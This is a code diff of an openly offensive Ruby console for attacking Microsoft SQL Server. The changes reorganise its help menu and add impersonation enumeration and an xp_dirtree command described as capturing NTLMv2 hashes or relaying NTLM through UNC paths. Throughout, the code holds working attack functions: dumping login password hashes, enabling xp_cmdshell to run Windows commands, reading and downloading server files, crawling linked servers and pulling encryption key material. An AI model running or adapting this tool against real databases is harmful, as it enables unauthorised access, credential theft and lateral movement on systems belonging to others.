@@ -12,7 +12,6 @@ require 'terminal-table'
 require 'optparse'
 require 'pry'
 
-
 class String
   def red; colorize(self, "\e[31m"); end
   def green; colorize(self, "\e[32m"); end
@@ -27,24 +26,11 @@ class String
 end
 
 def set_default_console
-  menu = %w[
-    help 
-    info whoami
-    dbs tables columns links 
-    query query-link exec 
-    cat mkdir download upload
-    logons sessions db-admins
-    enum-users enum-domain-groups
-    get-xpcmdshell enable-xpcmdshell disable-xpcmdshell 
-    verbose debug 
-    exit
-  ].sort
-
+  menu = Commands.new(nil).gen_help.values.map(&:keys).flatten
   comp = proc { |s| menu.grep(/^#{Regexp.escape(s)}/i) }
   Readline.completion_proc = comp
   trap('INT', 'DEFAULT')
 end
-
 
 class Commands
 
@@ -55,6 +41,12 @@ class Commands
     @verbose = 'false'
     @debug   = 'false'
   end
+
+  # 
+  # 
+  # Query Commands
+  # 
+  # 
   
   # @param [String] query
   #   the query to be sent
@@ -69,7 +61,8 @@ class Commands
   #   cmd_query(query1, {print: true, callback: query2})
   # 
   def cmd_query(query, opts = {print: true, callback: ->{}})
-      puts "[>] #{query}" if @verbose =~ /true/i
+    puts "[>] #{query}" if @verbose =~ /true/i
+    
     records = @db[%Q[#{query}]].all 
     table = Terminal::Table.new do |t|
       records.each do |record|
@@ -77,6 +70,7 @@ class Commands
         t << record.values.map {|r| r.nil?? next : r.to_s.wrap(50)}.flatten 
       end
     end
+
     puts table if (opts[:print] && !records.empty?)
     puts "[♦] ".cyan + "No records found." if (records.empty? && opts[:print])
     pp query   if @debug =~ /true/i
@@ -99,7 +93,7 @@ class Commands
     end
   end
 
-  def cmd_query_link(var=nil)
+  def cmd_query_link(val=nil)
     link = query = ""
     link  = Readline.readline("[+] ".cyan + "link hostname -> " ) until !link.empty?
     query = Readline.readline("[+] ".cyan + "query to send -> " ) until !query.empty?
@@ -107,7 +101,7 @@ class Commands
     cmd_query("SELECT * FROM OPENQUERY([#{link}], '#{query}')")
   end
 
-  def cmd_whoami(var=nil)
+  def cmd_whoami(val=nil)
     puts "[+] ".green.bold + "Current user"
     puts cmd_query("SELECT SYSTEM_USER as 'current_user'", print: false).first[:current_user]
     user_rule = cmd_query("SELECT is_srvrolemember('sysadmin') as user_rule", print: false).first
@@ -118,7 +112,7 @@ class Commands
     end
   end
 
-  def cmd_test(var=nil)
+  def cmd_test(val=nil)
     query = %Q[
 select  princ.name
 ,       princ.type_desc
@@ -135,7 +129,7 @@ on      perm.grantee_principal_id = princ.principal_id
     cmd_query(query)
   end
 
-  def cmd_info(var='')
+  def cmd_info(val='')
     puts "[+] ".green.bold + "Server Name"
     cmd_query('SELECT @@servername as "Server Name"')
     puts "[+] ".green.bold + "Server Version"
@@ -144,7 +138,7 @@ on      perm.grantee_principal_id = princ.principal_id
     cmd_query('SELECT servicename,service_account,startup_type_desc,filename FROM sys.dm_server_services')
     puts "[+] ".green.bold + "xp_cmdshell config:"
     cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options'")
-    puts "[♠] ".cyan + "you can use 'enable-xpshell' and 'disable-xpcmdshell' to change the values.".dark_cyan
+    puts "[♠] ".cyan + "you can use 'enable-xpcmdshell' and 'disable-xpcmdshell' to change the values.".dark_cyan
     puts "[+] ".green.bold + "Current user"
     cmd_query("SELECT SYSTEM_USER as 'Current User'")
     puts "[+] ".green.bold + "Domain"
@@ -152,7 +146,14 @@ on      perm.grantee_principal_id = princ.principal_id
     puts 
   end
 
-  def cmd_links(var=nil)
+
+  # 
+  # 
+  # Enumeration Commands
+  # 
+  # 
+
+  def cmd_links(val=nil)
     links = cmd_query("SELECT srvname FROM master..sysservers WHERE srvname!=@@servername AND srvproduct = 'SQL Server'")
     if !links.empty?
       links.map do |link|
@@ -163,13 +164,13 @@ on      perm.grantee_principal_id = princ.principal_id
     end
   end
 
-  def cmd_logons(var=nil)
+  def cmd_logons(val=nil)
     puts "[+] ".green.bold + "List of loggedin users"
     # cmd_query("SELECT principal_id AS id,name FROM sys.server_principals")
     cmd_query("SELECT sp.name AS login, sp.type_desc AS login_type, CONVERT([varchar](512), sl.password_hash, 1) AS password_hash, CASE WHEN sp.is_disabled = 1 then 'Disabled' else 'Enabled' end AS status FROM sys.server_principals sp left JOIN sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') ORDER BY sp.name;")
   end
 
-  def cmd_db_admins(var=nil)
+  def cmd_db_admins(val=nil)
     puts "[+] ".green.bold + "List of system admins"
     cmd_query("select mp.name as login, case when mp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status, mp.type_desc as type from sys.server_role_members srp join sys.server_principals mp on mp.principal_id = srp.member_principal_id join sys.server_principals rp on rp.principal_id = srp.role_principal_id where rp.name = 'sysadmin' order by mp.name;")
   end
@@ -205,46 +206,12 @@ on      perm.grantee_principal_id = princ.principal_id
     end
   end
 
-  def cmd_enable_xpcmdshell(var=nil)
-    puts "[+] ".green + "Current configurations:"
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
-    puts "[+] ".green + "Enabling xp_cmdshell"
-    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')")
-    puts "[+] ".green + "Modified configurations:"
-    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
+  def cmd_enum_impersonation(val=nil)
+    users = cmd_query("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'", print: false)
+    users.map {|user| puts "- ".green + user[:name]}
   end
 
-  def cmd_disable_xpcmdshell(var=nil)
-    puts "[+] ".green + "Current configurations:"
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
-    puts "[+] ".green + "Enabling xp_cmdshell"
-    cmd_query("EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')")
-    puts "[+] ".green + "Modified configurations:"
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
-  end
-
-  def enable_ole_automation
-    _print = @verbose =~ /true/i? true : false
-    puts "[+] ".green + "Current configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
-    puts "[+] ".green + "Enabling Ole Automation Procedures"
-    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''Ole Automation Procedures'', 1; reconfigure;')", {print: _print})
-    puts "[+] ".green + "Modified configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
-  end
-
-  def disable_ole_automation
-    _print = @verbose =~ /true/i? true : false
-    puts "[+] ".green + "Current configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
-    puts "[+] ".green + "Disabling Ole Automation Procedures"
-    cmd_query("EXEC('sp_configure ''Ole Automation Procedures'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')", {print: _print})
-    puts "[+] ".green + "Modified configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
-  end
-
-
-  def cmd_dbs(var=nil)
+  def cmd_dbs(val=nil)
     puts "[+] ".green + "List of databases:"
     cmd_query('SELECT database_id AS id, name AS db_name FROM sys.databases d')
   end
@@ -276,6 +243,12 @@ on      perm.grantee_principal_id = princ.principal_id
     #TBD 
     # query SELECT name FROM sys.procedures WHERE name LIKE '%read_txt_sp_%'
   end
+
+  # 
+  # 
+  # System Commands
+  # 
+  # 
 
   # 
   # Resources
@@ -382,6 +355,10 @@ on      perm.grantee_principal_id = princ.principal_id
     "rmdir C:\\db911 /S /Q"
   end
 
+  def cmd_dirtree(path)
+    cmd_query("EXEC master..xp_dirtree \"#{path}\",0,1;")
+  end
+
   def cmd_exec(cmd)
     if cmd.nil? || cmd.empty?
       puts "[!] ".yellow + "No command was provided"
@@ -394,6 +371,30 @@ on      perm.grantee_principal_id = princ.principal_id
   def cmd_get_allcredentials(val=nil)
     master_key = cmd_query("SELECT substring(crypt_property, 9, len(crypt_property) - 8) FROM sys.key_encryptions WHERE key_id=102 AND (thumbprint=0x03 or thumbprint=0x0300000001)")
   end
+
+  def cmd_enable_xpcmdshell(val=nil)
+    puts "[+] ".green + "Current configurations:"
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+    puts "[+] ".green + "Enabling xp_cmdshell"
+    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')")
+    puts "[+] ".green + "Modified configurations:"
+    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
+  end
+
+  def cmd_disable_xpcmdshell(val=nil)
+    puts "[+] ".green + "Current configurations:"
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+    puts "[+] ".green + "Enabling xp_cmdshell"
+    cmd_query("EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')")
+    puts "[+] ".green + "Modified configurations:"
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+  end
+
+  # 
+  # 
+  # Main Commands
+  # 
+  # 
 
   def cmd_verbose(val)
     if val.nil? || val.empty?
@@ -420,36 +421,92 @@ on      perm.grantee_principal_id = princ.principal_id
     exit!
   end
 
-  def cmd_help(var=nil)
-    puts "\n"
-    puts "Command".ljust(20," ") + "Description"
-    puts ("-"*"Command".size).ljust(20," ") + "-" * "Description".size
-    puts "query".ljust(20," ")                + "query <QUERY> - send raw query to the database."
-    puts "query-link".ljust(20," ")           + "query-link <LINK> <QUERY> - send raw query to the database."
-    puts "info".ljust(20," ")                 + "info - retrieve server information."
-    puts "whoami".ljust(20," ")               + "whoami - retrieve current user informaiton."
-    puts "db-admins".ljust(20," ")            + "db-admins - retrieve sysadmins."
-    puts "logons".ljust(20," ")               + "logons - retrieve logged-on users."
-    puts "sessions".ljust(20," ")             + "sessions - retrieve sessions (includes usernames and hostnames)."
-    puts "enum-domain-groups".ljust(20," ")   + "enum-domain-groups [DOMAIN]- retrieve domain groups."
-    puts "dbs".ljust(20," ")                  + "dbs - list databases."
-    puts "tables".ljust(20," ")               + "tables <DB_Name> - list tables for database."
-    puts "columns".ljust(20," ")              + "columns <Table_Name> - list columns from table."
-    puts "exec".ljust(20," ")                 + "exec <CMD> - Execute Windows commands using xp_cmdshell."
-    puts "cat".ljust(20," ")                  + "cat <FILE> - Read file from disk. (full path must given)"
-    puts "mkdir".ljust(20," ")                + "mkdir <DIR> - Create directories and subdirectories (acts like mkdir -p). (full path must given)"
-    puts "download".ljust(20," ")             + "download <FILE> - Download files from MSSQL server system. (full path must given)"
-    puts "enable-xpcmdshell".ljust(20," ")    + "enable-xpcmdshell - enable xp_cmdshell on MSSQL."
-    puts "disable-xpcmdshell".ljust(20," ")   + "disable-xpcmdshell - disable xp_cmdshell on MSSQL."
-    puts "links".ljust(20," ")                + "links - crawl MSSQL links."
-    puts "verbose".ljust(20," ")              + "verbose [true | false] - show queries behind built-in commands."
-    puts "debug".ljust(20," ")                + "debug [true | false] - show queries values behind executed queries."
-    puts "help".ljust(20," ")                 + "Show this screen"
-    puts "exit".ljust(20," ")                 + "exit the console"
-    puts "\n"
+  def gen_help
+    main = {
+      "query" => "query <QUERY> - send raw query to the database.",
+      "query-link" => "query-link <LINK> <QUERY> - send raw query to the database.",
+      "verbose" => "verbose [true | false] - show queries behind built-in commands.",
+      "debug" => "debug [true | false] - show queries values behind executed queries.",
+      "help" => "Show this screen",
+      "exit" => "exit the console"
+    }
+
+    system = {
+      "exec" => "exec <CMD> - Execute Windows commands using xp_cmdshell.",
+      "cat" => "cat <FILE> - Read file from disk. (full path must given)",
+      "mkdir" => "mkdir <DIR> - Create directories and subdirectories (acts like mkdir -p). (full path must given)",
+      "dirtree" => "dirtree <UNC> - Execute xp_dirtree to list local or remote(UNC) system's files & directories. UNC path can be used to capture NTLMv2 hash or NTLM-relay.",
+      "download" => "download <FILE> - Download files from MSSQL server system. (full path must given)",
+      "enable-xpcmdshell" => "enable-xpcmdshell - enable xp_cmdshell on MSSQL.",
+      "disable-xpcmdshell" => "disable-xpcmdshell - disable xp_cmdshell on MSSQL."
+    }
+
+    enum = {
+      "info" => "info - retrieve server information.",
+      "whoami" => "whoami - retrieve current user informaiton.",
+      "db-admins" => "db-admins - retrieve sysadmins.",
+      "logons" => "logons - retrieve logged-on users.",
+      "sessions" => "sessions - retrieve sessions (includes usernames and hostnames).",
+      "enum-domain-groups" => "enum-domain-groups [DOMAIN]- retrieve domain groups.",
+      "enum-impersonation" => "enum-impersonation - enumerate impersonationable users.",
+      "dbs" => "dbs - list databases.",
+      "tables" => "tables <DB_Name> - list tables for database.",
+      "columns" => "columns <Table_Name> - list columns from table.",
+      "links" => "links - crawl MSSQL links.",
+    }
+
+    commands = {main: main, system: system, enum: enum}
   end
 
-  
+  def cmd_help(val=nil)
+    headings = "Command".ljust(20," ") + "Description"
+    headings_lines = ("-"*"Command".size).ljust(20," ") + ("-" * "Description".size)
+    end_line = ("-" * headings_lines.size)
+    puts
+    puts headings
+    puts headings_lines
+
+    puts "--[ " + "Main".cyan + " ]---------------------"
+    gen_help[:main].each do |cmd, desc|
+      puts cmd.ljust(20," ") + desc
+    end
+    puts "--[ " + "System".cyan + " ]-------------------"
+    gen_help[:system].each do |cmd, desc|
+      puts cmd.ljust(20," ") + desc
+    end
+    puts "--[ " + "Enumuration".cyan + " ]-------------"
+    gen_help[:enum].each do |cmd, desc|
+      puts cmd.ljust(20," ") + desc
+    end
+    puts 
+    return
+  end
+
+  # 
+  # 
+  # Internal 
+  # 
+  # 
+  def enable_ole_automation
+    _print = @verbose =~ /true/i? true : false
+    puts "[+] ".green + "Current configurations:" if _print
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+    puts "[+] ".green + "Enabling Ole Automation Procedures"
+    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''Ole Automation Procedures'', 1; reconfigure;')", {print: _print})
+    puts "[+] ".green + "Modified configurations:" if _print
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+  end
+
+  def disable_ole_automation
+    _print = @verbose =~ /true/i? true : false
+    puts "[+] ".green + "Current configurations:" if _print
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+    puts "[+] ".green + "Disabling Ole Automation Procedures"
+    cmd_query("EXEC('sp_configure ''Ole Automation Procedures'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')", {print: _print})
+    puts "[+] ".green + "Modified configurations:" if _print
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+  end
+
   def create_readfile_procedure
     procedure_name = "read_txt_sp_#{('a1'..'z9').to_a.sample(5).join}"
     puts "[*] ".green + "Creating stored procedure '#{procedure_name}'."
@@ -576,7 +633,7 @@ begin
   DB = Sequel.connect(db_conn)
   @commands = Commands.new(DB)
   puts "[+] ".green + "Connected to '#{db_conn[:host]}:#{db_conn[:port]}'."
-  puts @commands.run_command('help')
+  puts "[¡] ".dark_cyan + "run 'help' to list avilable commands."
 
 
   set_default_console
